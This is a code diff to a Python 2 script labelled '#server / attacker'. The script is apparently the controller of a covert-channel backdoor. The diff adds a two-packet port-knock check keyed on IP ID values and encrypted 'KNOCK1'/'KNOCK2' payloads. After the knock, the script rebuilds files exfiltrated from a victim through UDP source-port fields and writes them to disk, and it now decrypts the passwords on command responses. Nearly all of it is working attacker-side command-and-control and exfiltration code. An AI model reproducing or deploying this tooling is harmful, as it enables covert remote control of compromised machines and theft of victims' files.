@@ -1,3 +1,4 @@
+
 #server / attacker
 import ConfigParser, threading, hashlib, sys, os, socket
 import pcapy #sudo apt-get install python-pcapy
@@ -18,6 +19,8 @@ fileDir = configParser.get('config', 'fileDir')
 key = configParser.get('config', 'password')
 print dstIP
 fileMessage = []
+portKnock = [0,0]
+doorOpen = 0
 
 #----------------------------------------------------------------------
 #-- FUNCTION: checkRoot()
@@ -95,11 +98,56 @@ def getFile():
         victimFile = parse_file_packet(packet)
 
 
+def checkKnock(packet):
+    global portKnock
+    global doorOpen
+
+    eth_length = 14
+    eth_header = packet[:eth_length]
+    eth = unpack('!6s6sH', eth_header)
+    eth_protocol = socket.ntohs(eth[2])
+# Parse IP packets, IP Protocol number = 8
+
+    if eth_protocol == 8:
+        ip_header = packet[eth_length:20 + eth_length]
+        iph = unpack('!BBHHHBBH4s4s', ip_header)
+        version_ihl = iph[0]
+        version = version_ihl >> 4
+        ihl = version_ihl & 0xF
+        iph_length = ihl * 4
+        ttl = iph[5]
+        ipid = iph[3]
+        if (ipid ==4567):
+            protocol = iph[6]
+            s_addr = socket.inet_ntoa(iph[8]);
+            d_addr = socket.inet_ntoa(iph[9]);
+            if protocol == 17:
+                udph_length = 8
+                h_size = eth_length + iph_length + udph_length
+                password = packet[h_size:]
+                if decrypt(password.rstrip('\x00')) == "KNOCK1":
+                    portKnock[0] = 1
+                    print "KNOCK1"
+
+        elif (ipid == 5678):
+            protocol = iph[6]
+            s_addr = socket.inet_ntoa(iph[8]);
+            d_addr = socket.inet_ntoa(iph[9]);
+            if protocol == 17:
+                udph_length = 8
+                h_size = eth_length + iph_length + udph_length
+                password = packet[h_size:]
+                if decrypt(password.rstrip('\x00')) == "KNOCK2":
+                    if portKnock[0] ==1:
+                        portKnock[1] =1
+                        print "KNOCK2"
 
 
-def parse_file_packet(packet):
+
+
+
+def receiveFile(packet):
     global fileMessage
-    # parse ethernet header
     eth_length = 14
     eth_header = packet[:eth_length]
     eth = unpack('!6s6sH', eth_header)
@@ -117,8 +165,9 @@ def parse_file_packet(packet):
         ipid = iph[3]
 
 
-        #if (ttl == 144):
+
         if (ipid == 123):
+
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
             d_addr = socket.inet_ntoa(iph[9]);
@@ -137,7 +186,10 @@ def parse_file_packet(packet):
                 source_port = udph[0]#byte stored here
                 fileMessage.append(source_port)
 
+
+
         if (ipid ==1234):
+
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
             d_addr = socket.inet_ntoa(iph[9]);
@@ -154,28 +206,42 @@ def parse_file_packet(packet):
                 udph = unpack('!HHHH', udp_header)
                 fileName = packet[h_size:]
 
-                fileName = (fileName.rstrip('\x00'))
-
-
-
-
-
-
-
-
-
-
+                fileName = decrypt(fileName.rstrip('\x00'))
+                print "\n File " + str(fileName) + " has been modified"
 
                 fileString = ""
                 for m in fileMessage:
                     fileString += chr(m)
 
                 newFile = open (fileName, 'w')
-                newFile.write(fileString)
+                newFile.write(decrypt(fileString))
                 newFile.close()
-                print "\n File " + str(fileName) + " has been modified"
                 fileString=""
                 fileMessage = []
+                portKnock [0] = 0
+                portKnock [1] = 0
+                doorOpen = 0
+
+
+
+def parse_file_packet(packet):
+    global fileMessage
+    global portKnock
+    global doorOpen
+    # parse ethernet header
+
+    if (portKnock[0]==1 and portKnock[1]==1):
+        doorOpen ==1
+        receiveFile(packet)
+
+    if doorOpen == 0:
+        checkKnock(packet)
+
+
+
+
+        #if (ttl == 144):
+
 
 
 
@@ -229,6 +295,7 @@ def getCmd():
             #convert password to binary
             password = string_bin(password)
             '''
+            #signature = encrypt(key)
             #create a packet to send to the victim
             sendCommand(protocol, encryptedCmd, 1000)
             sniffer()
@@ -420,7 +487,7 @@ def parse_packet(packet):
                 h_size = eth_length + iph_length + tcph_length * 4
                 data_size = len(packet) - h_size
                 password = packet[h_size:len(packet)-2]
-                if(password == "1000"):
+                if(decrypt(password) == "1000"):
                     source_port = tcph[0]
                     dest_port = tcph[1]
                     sequence = tcph[2]
@@ -439,7 +506,8 @@ def parse_packet(packet):
 
 
                     #print 'Data : ' + result
-                    print result,
+                    sys.stdout.write(result)
+                    #print result,
                     if (iph[3] == 2):
                         return True
 
@@ -449,7 +517,7 @@ def parse_packet(packet):
                 h_size = eth_length + iph_length + udph_length
                 password = packet[h_size:len(packet)-14]
                 #print "test"
-                if(password == "1000"):
+                if(decrypt(password) == "1000"):
                     u = iph_length + eth_length
 
                     udp_header = packet[u:u + 8]
@@ -473,7 +541,8 @@ def parse_packet(packet):
                     result = source_port
                     result = chr(source_port)
 
-                    print result,
+                    #print result,
+                    sys.stdout.write(result)
                     if (iph[3] == 2):
                         return True
 
